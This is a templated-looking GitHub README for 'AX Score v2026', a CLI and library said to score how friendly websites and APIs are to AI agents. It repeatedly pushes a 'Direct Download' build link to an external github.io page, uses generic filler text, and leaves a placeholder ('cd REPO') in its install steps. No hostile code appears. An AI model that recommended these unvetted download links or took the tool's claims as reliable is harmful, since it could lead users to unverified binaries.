# AX Score v2026 - CLI tool / library 2026

> **AX Score is a Web-based, open-source CLI tool and library that helps teams measure agent-friendliness for websites and APIs, with version 2026 focused on AI-agent and LLM workflows.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/walkerdylan/ax-score-v2026-cli?style=flat-square)](https://github.com/walkerdylan/ax-score-v2026-cli)

---

<p align="center">
  <a href="https://walkerdylan.github.io/ax-score-v2026-cli/">
    <img src="https://img.shields.io/badge/Download-AX%20Score%20Latest-brightgreen?style=for-the-badge" alt="Download AX Score">
  </a>
</p>

> **[Direct Download - AX Score v2026](https://walkerdylan.github.io/ax-score-v2026-cli/)**

---

[Download Latest Build](https://walkerdylan.github.io/ax-score-v2026-cli/)

---

## What AX Score Does

AX Score is intended to assess how accessible a website or API is to AI agents. It looks at agent-experience signals so teams can inspect the parts of a system that affect LLM-based workflows, automated usage, and tool-driven interactions.

The project is offered in two forms: a CLI and a library. That makes it suitable for one-off checks, repeatable audits, or TypeScript integrations inside existing developer tooling. Whether you need to evaluate a single endpoint or add agent-friendliness checks to a larger pipeline, AX Score gives you a straightforward way to measure that surface.

---

## Capabilities

- Measures agent-friendliness for websites and APIs
- Supports website and API auditing workflows
- Available as an open-source CLI tool
- Can be used as a library for AI integration
- Built with TypeScript for developer-focused use
- Aligned with agent-experience and AI-agent testing needs
- Useful for LLM-oriented audits and reviews
- Fits into automation, inspection, and evaluation pipelines

---

## Getting Started

Clone the repository or download the project files, then install dependencies with your preferred package manager.

git clone https://github.com/walkerdylan/ax-score-v2026-cli.git
cd REPO
npm install

After setup, you can either run the CLI directly or bring the library into your own project, depending on the workflow you need.

---

## How to Use It

Use AX Score from the terminal to audit a website or API and inspect the agent-friendliness results it produces.

ax-score audit <target>

If you are working in TypeScript, you can also wire the library into your own tooling to evaluate agent-experience during development or automated checks:

import { score } from "ax-score"

const result = await score("https://example.com")

Review the output to compare surfaces, spot friction for AI agents, and monitor changes over time.

---

## Configuration

AX Score can be set up through CLI flags or via the configuration used by your integration layer.

If your process relies on a local config file, store the audit target, output settings, and any environment-specific values there so repeated runs stay consistent.

Example structure:

{
  "target": "https://example.com",
  "mode": "audit",
  "format": "json"
}

---

## Requirements

- A Web-accessible target for auditing
- A local environment capable of running a CLI tool
- TypeScript support if you plan to use the library directly
- Enough storage for your project checkout and audit outputs
- A current Node.js-based development setup is recommended for CLI and library workflows

---

## Common Questions

**What is AX Score for?**  
It measures agent-friendliness for websites and APIs, with a particular focus on AI-agent and LLM-oriented workflows.

**Is it only a CLI tool?**  
No. AX Score ships as both a CLI and a library, so it can be used in scripts or embedded in TypeScript projects.

**How do I update it?**  
Pull the latest repository changes or fetch the latest build from the project download link, then reinstall or rebuild if your workflow requires it.

**Where are configuration changes made?**  
Configuration is usually handled through CLI arguments, local project settings, or the integration code that calls the library.

**What should I check if an audit does not work?**  
Confirm the target URL or API endpoint, review your local runtime setup, and verify any config values used by the command or library call.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
